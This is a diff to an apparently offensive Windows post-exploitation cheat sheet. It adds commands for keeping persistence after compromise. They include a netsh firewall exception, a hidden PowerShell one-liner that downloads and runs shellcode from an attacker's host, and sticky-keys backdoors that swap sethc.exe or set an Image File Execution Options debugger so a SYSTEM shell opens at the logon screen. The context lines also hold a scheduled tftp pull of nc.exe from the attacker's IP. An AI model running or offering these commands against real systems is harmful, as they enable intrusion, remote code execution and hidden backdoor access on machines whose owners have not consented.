@@ -13,19 +13,26 @@ return false;
 
 Commands to run to maintain persistence after you have exploited it and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.
 
+### Firewall Exceptions
+When you modify a system to talk on the network, you may need to alter the Windows firewall so your traffic is not filtered. The `netsh` command can be used to do this as the command to enable Remote Desktop Protocol below shows:
+
+`netsh firewall set service type = remotedesktop mode = enable`
+
+
+### Powershell Downloader
+ * **Command with arguments**: `powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))"`
+ * **Description**: According to [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), _"Schedule this and it will execute the shellcode on that page, pulling it each time (so you can change as needed)"_. 
+
+
 ### Remote Assistance Enable
  * **Command with arguments**: `reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f`
  * **Description**: **Must be admin to run this.** Enable remote assistance through adding a registry entry on the local system.
- * **Output**:
-   * <div class="slide" style="cursor: pointer;"> **Windows 2008:** Show/Hide</div><div class="view"><code>C:\Windows\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-The operation completed successfully.</code></div> 
+
 
 ### Remote Desktop Enable - Method 1
  * **Command with arguments**: `reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f`
- * **Description**: **Must be admin to run this.** Enable remote desktop through adding a registry entry on the local system.
- * **Output**:
-   * <div class="slide" style="cursor: pointer;"> **Windows 2008:** Show/Hide</div><div class="view"><code>C:\Windows\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-The operation completed successfully.</code></div> 
+ * **Description**: **Must be admin to run this.** Enable remote desktop through adding a registry entry on the local system. 
+
 
 ### Remote Desktop Enable - Method 2
 Remote Desktop allows a remote user to receive a graphical "desktop" of the target (compromised) system. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 53)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can remotely enable remote desktop using the commands below.
@@ -77,3 +84,19 @@ c:\> at \\[TargetIP] 12:00 pm command
 </pre>
 
 An example you might run on the remote system might be: `at \\192.168.1.1 12:00pm tftp -I [MyIP] GET nc.exe`
+
+
+### Sticky Keys (Requires reboot)
+Sticky keys on Windows systems are activated when the user presses the SHIFT key 5 times. Here, according to the [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), you replace the sethc.exe binary with your own binary (cmd.exe maybe?) and, when SHIFT is pressed 5 times, your binary is executed. Your binary will execute as SYSTEM and needs to replace the `%WINDIR%\System32\sethc.exe`. 
+
+Some caveats:
+* If NLA (Network Layer Authentication) is enabled, this won't work
+* If RDP (Remote Desktop Protocol) is disabled, this won't work
+
+
+### Sticky Keys (No reboot)
+This technique uses registry entries to switch the binary that the sticky keys executes. Its real advantage is that it does not require a reboot for the switch to take place. 
+* In the `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` make a key called `sethc.exe`
+* Make a REG_SZ value called "Debugger" (Ensure it is capitalized)
+* For the "Debugger" REG_SZ, make it have a value of your binary
+* Press SHIFT 5 times and your binary should be executed
